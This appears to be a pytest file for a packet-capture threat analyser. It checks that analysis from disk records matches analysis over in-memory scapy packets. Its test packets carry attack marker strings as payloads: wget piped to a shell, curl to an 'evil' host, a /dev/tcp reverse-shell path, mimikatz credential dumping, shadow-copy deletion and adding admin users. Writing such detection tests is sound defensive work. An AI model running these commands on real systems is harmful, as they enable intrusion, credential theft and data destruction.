"""analyze_threats' own pass reads lite records from disk: a TCP/UDP segment
whose payload scapy leaves Raw is counted from its bytes, every other record is
dissected. What the pass builds must equal what it builds over scapy packets
(in memory), container for container and in the same order."""

from __future__ import annotations

import ast
import inspect
import shutil
import textwrap
from pathlib import Path

import pytest

pytest.importorskip("scapy")

from scapy.all import (  # noqa: E402
    ARP,
    DNS,
    DNSQR,
    ICMP,
    IP,
    TCP,
    UDP,
    CookedLinux,
    Dot1Q,
    Ether,
    IPv6,
    Raw,
    wrpcap,
)
from test_lite_it_paths import _frames as _it_frames  # noqa: E402

from pcapper import pcap_cache, port_heuristics, threats, utils  # noqa: E402
from pcapper.lite import UNSUPPORTED, LitePacket  # noqa: E402

DATA = Path(__file__).parent / "data"

A, B, C = "10.0.0.1", "10.0.0.2", "192.168.1.9"
PUB, PUB2 = "8.8.8.8", "93.184.216.34"
ETH = Ether(src="00:11:22:33:44:55", dst="66:77:88:99:aa:bb")

# EtherNet/IP encapsulation: RegisterSession (no CIP), SendRRData carrying a
# CIP service code; DNP3 link header (0x0564, length 5..255).
ENIP_REGISTER = b"\x65\x00\x04\x00" + b"\x00" * 20 + b"\x01\x00\x00\x00"
ENIP_RR_DATA = b"\x6f\x00\x10\x00" + b"\x00" * 20 + b"\x00" * 12 + b"\xb2\x00\x52\x02"
DNP3_FRAME = b"\x05\x64\x05\xc9\x01\x00\x00\x04\xe9\x21"


def _threat_packets() -> list:
    """What the own pass counts: SYNs (auth, lateral, scan), markers in a
    payload or in the padding behind an empty segment, failed logins, OT
    ports either way round, strict EtherNet/IP and DNP3 markers, safety
    ports, public peers, odd TCP flags and UDP lengths -- and records only
    scapy answers (DNS, ICMP, ARP, a fragment)."""
    return [
        ETH / IP(src=A, dst=B) / TCP(sport=40100, dport=22, flags="S"),
        ETH / IP(src=A, dst=B) / TCP(sport=40101, dport=445, flags="S"),
        ETH / IP(src=B, dst=A) / TCP(sport=445, dport=40101, flags="SA"),
        ETH / IP(src=A, dst=B) / TCP(sport=40102, dport=3389, flags="SEC"),
        ETH / IP(src=A, dst=C) / TCP(sport=40103, dport=1433, flags=0x102),
        ETH / IP(src=A, dst=B) / TCP(sport=40104, dport=0, flags="S"),
        ETH / IP(src=A, dst=B) / TCP(sport=40105, dport=5985, flags="FSRPAUECN"),
        ETH / IP(src=B, dst=A) / TCP(sport=110, dport=40106, flags="PA") / Raw(b"-ERR authentication failed\r\n"),
        ETH / IP(src=A, dst=B) / TCP(sport=40107, dport=21, flags="PA") / Raw(b"USER x\r\nLogin FAILED\r\n"),
        ETH / IP(src=A, dst=PUB) / TCP(sport=40108, dport=8080, flags="PA") / Raw(b"GET /?q=PowerShell.exe -EncodedCommand AAAA HTTP/1.1\r\n\r\n"),
        ETH / IP(src=A, dst=B) / UDP(sport=40109, dport=9999) / Raw(b"cmd.exe /c whoami /all & net user "),
        ETH / IP(src=A, dst=B) / TCP(sport=40110, dport=9001, flags="PA", options=[("MSS", 1460), ("NOP", None), ("WScale", 7)]) / Raw(b"wget http://x/y | /bin/sh -c"),
        ETH / IP(src=A, dst=B) / TCP(sport=40111, dport=502, flags="PA") / Raw(b"\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x0a"),
        ETH / IP(src=PUB2, dst=A) / TCP(sport=40112, dport=502, flags="S"),
        ETH / IP(src=A, dst=PUB2) / TCP(sport=502, dport=40112, flags="SA"),
        ETH / IP(src=A, dst=B) / TCP(sport=40113, dport=44818, flags="PA") / Raw(ENIP_REGISTER),
        ETH / IP(src=B, dst=A) / TCP(sport=44818, dport=50000, flags="PA") / Raw(ENIP_RR_DATA),
        ETH / IP(src=A, dst=B) / TCP(sport=44818, dport=80, flags="PA") / Raw(ENIP_RR_DATA),
        ETH / IP(src=A, dst=B) / UDP(sport=40114, dport=2222) / Raw(ENIP_REGISTER),
        ETH / IP(src=B, dst=A) / UDP(sport=2222, dport=40114) / Raw(ENIP_RR_DATA),
        ETH / IP(src=A, dst=B) / TCP(sport=40115, dport=20000, flags="PA") / Raw(DNP3_FRAME),
        ETH / IP(src=B, dst=PUB) / UDP(sport=20000, dport=40116) / Raw(b"xx" + DNP3_FRAME),
        ETH / IP(src=A, dst=B) / TCP(sport=40117, dport=1502, flags="S"),
        ETH / IP(src=B, dst=A) / UDP(sport=1500, dport=40118) / Raw(b"tsaa"),
        ETH / IP(src=A, dst=B) / UDP(sport=40119, dport=0) / Raw(b"reg add HKLM\\x"),
        # UDP lengths shorter than the datagram: Raw ends early (len 4 cuts
        # four bytes off the end), or there is no Raw and the bytes are padding.
        ETH / IP(src=A, dst=B) / UDP(sport=40120, dport=9998, len=4) / Raw(b"net user admin /add ...."),
        ETH / IP(src=A, dst=B) / UDP(sport=40121, dport=9997, len=8) / Raw(b"net localgroup admins"),
        ETH / Dot1Q(vlan=7) / IP(src=A, dst=B) / TCP(sport=40122, dport=3389, flags="S"),
        ETH / IPv6(src="fe80::1", dst="fe80::2") / TCP(sport=40123, dport=22, flags="S"),
        ETH / IPv6(src="fd00::1", dst="2001:4860:4860::8888") / UDP(sport=40124, dport=9990) / Raw(b"schtasks /create /tn x"),
        ETH / IP(src=PUB, dst=A) / TCP(sport=443, dport=40125, flags="PA") / Raw(b"curl http://evil/x"),
        # Only scapy answers these: DNS (a long label, TXT), ICMP and a
        # non-first fragment carrying markers, ARP, DHCP (0.0.0.0 -> broadcast).
        ETH / IP(src=A, dst=B) / UDP(sport=40126, dport=53) / DNS(rd=1, qd=DNSQR(qname="a" * 40 + ".example.com", qtype="TXT")),
        ETH / IP(src=A, dst=PUB) / ICMP() / Raw(b"powershell.exe -enc"),
        ETH / IP(src=A, dst=B, proto=6, frag=100) / Raw(b"mimikatz sekurlsa::logonpasswords"),
        ETH / ARP(psrc=A, pdst=B),
        ETH / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) / Raw(b"\x01" * 240),
    ]


def _padded(frame) -> bytes:  # type: ignore[no-untyped-def]
    data = bytes(frame)
    if len(data) < 60:
        data += bytes(range(1, 61 - len(data)))  # padding that is not zero
    return data


def _frames() -> list:
    out = list(_it_frames())
    for frame in _threat_packets():
        out.append(Ether(_padded(frame)))
    # Empty segments whose padding holds markers and a failed login: scapy's
    # bytes(TCP.payload) is that padding, and the pass scans it.
    for frame, tail in (
        (ETH / IP(src=A, dst=B) / TCP(sport=40130, dport=9000, flags="A"), b"mimikatz sekurlsa"),
        (ETH / IP(src=B, dst=A) / TCP(sport=21, dport=40131, flags="A"), b"530 login failed"),
        (ETH / IP(src=A, dst=B) / UDP(sport=40132, dport=9991, len=8), b"vssadmin delete shadows"),
        (ETH / IP(src=A, dst=B) / TCP(sport=40133, dport=44818, flags="A"), ENIP_REGISTER),
    ):
        out.append(Ether(bytes(frame) + tail))
    return out


def _l3_packets() -> list:
    """The same kinds of packets without an Ethernet header."""
    return [
        IP(src=A, dst=B) / TCP(sport=40140, dport=445, flags="S"),
        IP(src=A, dst=PUB) / TCP(sport=40141, dport=8080, flags="PA") / Raw(b"invoke-expression"),
        IP(src=A, dst=B) / UDP(sport=40142, dport=2222) / Raw(ENIP_REGISTER),
        IP(src=A, dst=B) / UDP(sport=40143, dport=53) / DNS(rd=1, qd=DNSQR(qname="b" * 33 + ".test")),
        IP(src=A, dst=B) / ICMP() / Raw(b"/dev/tcp/1.2.3.4/4444"),
        IPv6(src="fe80::1", dst="fe80::2") / TCP(sport=40144, dport=3389, flags="S"),
    ]


@pytest.fixture()
def captures(tmp_path: Path) -> list[Path]:
    edge = tmp_path / "edge.pcap"
    wrpcap(str(edge), _frames())
    raw_ip = tmp_path / "raw_ip.pcap"
    wrpcap(str(raw_ip), [p.__class__(bytes(p)) for p in _l3_packets()], linktype=101)
    cooked = tmp_path / "cooked.pcap"
    wrpcap(
        str(cooked),
        [
            CookedLinux(bytes(CookedLinux(pkttype=0, lladdrtype=1, lladdrlen=6, src=b"\x00\x11\x22\x33\x44\x55\x00\x00", proto=0x0800 if isinstance(p, IP) else 0x86DD) / p))
            for p in _l3_packets()
        ],
    )
    paths = [edge, raw_ip, cooked]
    for name in (
        "mixed.pcap", "mixed.pcapng", "http.pcap", "dns.pcap", "tls.pcap", "truncated.pcap",
        "voip_attack.pcap", "voip.pcap", "voip_multiproto.pcap", "modbus.pcap", "carve_gap.pcap",
    ):
        target = tmp_path / name
        shutil.copy(DATA / name, target)
        paths.append(target)
    return paths


@pytest.fixture(autouse=True)
def _fresh(monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setenv("PCAPPER_CACHE_ENABLED", "0")
    _clear()
    yield
    _clear()


def _clear() -> None:
    utils.clear_analysis_memo()
    pcap_cache._PACKET_CACHE.clear()
    port_heuristics.clear_detections()


def _state_names() -> list[str]:
    """Every name analyze_threats binds before its own loop: the state that
    loop builds (and the lists it shares with what follows)."""
    func = inspect.unwrap(threats.analyze_threats)
    tree = ast.parse(textwrap.dedent(inspect.getsource(func)))
    names: list[str] = []
    for stmt in tree.body[0].body:  # type: ignore[attr-defined]
        if isinstance(stmt, ast.For):
            break
        targets = stmt.targets if isinstance(stmt, ast.Assign) else [stmt.target] if isinstance(stmt, ast.AnnAssign) else []
        names.extend(t.id for t in targets if isinstance(t, ast.Name))
    assert {"src_counts", "pair_ports", "command_markers", "strict_ot_pairs", "first_seen", "total_packets"} <= set(names)
    return names


def _plain(value: object) -> object:
    """Containers as nested lists in iteration order (a defaultdict's factory,
    a lambda here, never prints the same twice)."""
    if isinstance(value, dict):
        return [type(value).__name__, [(key, _plain(item)) for key, item in value.items()]]
    if isinstance(value, (set, frozenset)):
        return ["set", [_plain(item) for item in value]]
    if isinstance(value, list):
        return [_plain(item) for item in value]
    return value


class _EndOfLoop(Exception):
    pass


def _loop_state(monkeypatch: pytest.MonkeyPatch, path: Path, **kwargs) -> dict[str, str]:  # type: ignore[no-untyped-def]
    """The own pass's state as the loop leaves it: the call stops at the first
    nested analysis after the loop."""

    def stop(*args, **kw):  # type: ignore[no-untyped-def]
        raise _EndOfLoop

    monkeypatch.setattr(threats, "analyze_icmp", stop)
    code = inspect.unwrap(threats.analyze_threats).__code__
    _clear()
    try:
        threats.analyze_threats(path, show_status=False, **kwargs)
    except _EndOfLoop as exc:
        tb = exc.__traceback__
        while tb is not None and tb.tb_frame.f_code is not code:
            tb = tb.tb_next
        assert tb is not None
        local = tb.tb_frame.f_locals
        return {name: repr(_plain(local[name])) for name in _state_names()}
    raise AssertionError("analyze_threats did not reach its nested analyses")


def test_own_pass_from_disk_builds_what_scapy_packets_build(
    monkeypatch: pytest.MonkeyPatch, captures: list[Path]
) -> None:
    counted: list[int] = []  # records counted from their bytes, per run
    real_flow = threats._lite_flow

    def flow(record):  # type: ignore[no-untyped-def]
        answer = real_flow(record)
        counted[-1] += answer is not None
        return answer

    monkeypatch.setattr(threats, "_lite_flow", flow)
    for path in captures:
        counted.append(0)
        from_disk = _loop_state(monkeypatch, path)
        packets, meta = pcap_cache.load_packets(path, show_status=False)
        assert packets and not isinstance(packets[0], LitePacket)
        counted.append(0)
        in_memory = _loop_state(monkeypatch, path, packets=packets, meta=meta)
        assert from_disk == in_memory, path.name
        assert counted[-1] == 0, path.name  # scapy packets take the scapy path
        if path.name == "edge.pcap":  # the fixture reaches every counter
            assert counted[-2] >= 40, counted[-2]  # most of it counted from bytes
            empty = {
                name for name, text in from_disk.items()
                if text in ("['Counter', []]", "['defaultdict', []]", "['dict', []]", "['set', []]")
            }
            assert empty == {"credential_exposure_sources"}, empty  # filled after the loop


def test_from_disk_equals_scapy_packets(captures: list[Path]) -> None:
    """The whole summary, nested analyses included (they read the capture as
    they do; only the own pass changed)."""
    for path in captures:
        _clear()
        from_disk = threats.analyze_threats(path, show_status=False)
        packets, meta = pcap_cache.load_packets(path, show_status=False)
        _clear()
        in_memory = threats.analyze_threats(path, show_status=False, packets=packets, meta=meta)
        assert repr(from_disk) == repr(in_memory), path.name


def test_lite_flow_is_what_the_scapy_path_reads(captures: list[Path]) -> None:
    """Record for record: a record _lite_flow answers has one transport layer
    and no DNS layer, and its ports, SYN test and payload are scapy's."""
    kinds = set()
    ports: set[int] = set()
    for path in captures:
        for record in pcap_cache.iter_packets(path, show_status=False, lite=True):
            pkt = record.materialize()
            assert utils.extract_packet_endpoints(record) == utils.extract_packet_endpoints(pkt)
            assert utils.packet_length(record) == utils.packet_length(pkt)
            flow = threats._lite_flow(record)
            l4 = record.lite_l4()
            if flow is None:
                kinds.add("unsupported" if l4 is UNSUPPORTED else "no-l4" if l4 is None else "app-layer")
                continue
            is_tcp, sport, dport, flags, payload = flow
            assert not pkt.haslayer(DNS)
            assert bool(pkt.haslayer(TCP)) is is_tcp
            assert bool(pkt.haslayer(UDP)) is not is_tcp
            layer = pkt[TCP] if is_tcp else pkt[UDP]
            assert (int(getattr(layer, "sport", 0) or 0), int(getattr(layer, "dport", 0) or 0)) == (sport, dport)
            if is_tcp:
                assert flags == int(layer.flags)
                assert threats._tcp_is_syn(flags) == threats._tcp_is_syn(layer.flags)
            else:
                assert flags is None
            assert payload == threats._payload_bytes(pkt), (path.name, record.original.hex())
            kinds.add(("raw" if pkt.haslayer(Raw) else "padding" if payload else "empty", is_tcp))
            ports.update((sport, dport))
    assert {"unsupported", "no-l4", "app-layer"} <= kinds
    assert {("raw", True), ("raw", False), ("padding", True), ("padding", False), ("empty", True)} <= kinds
    # The auth, lateral, OT (strict markers included) and safety counts are
    # reached by records counted from their bytes, not only dissected ones.
    assert {21, 22, 110, 502, 1433, 1500, 1502, 2222, 3389, 5985, 20000, 44818} <= ports


def test_int_flags_answer_the_syn_test_as_scapy_flags_do() -> None:
    """Every 9-bit flags value: the record's int is scapy's FlagValue, and
    _tcp_is_syn (int branch) agrees with it on the FlagValue (text branch)."""
    for value in range(512):
        data = bytes(Ether() / IP(src=A, dst=B) / TCP(sport=40000, dport=40001, flags=value))
        record = LitePacket(data, 1, ("us", 1, 0), len(data))
        flow = threats._lite_flow(record)
        assert flow is not None and flow[0] is True
        flags = Ether(data)[TCP].flags
        assert flow[3] == value == int(flags)
        assert threats._tcp_is_syn(flow[3]) == threats._tcp_is_syn(flags), (value, str(flags))
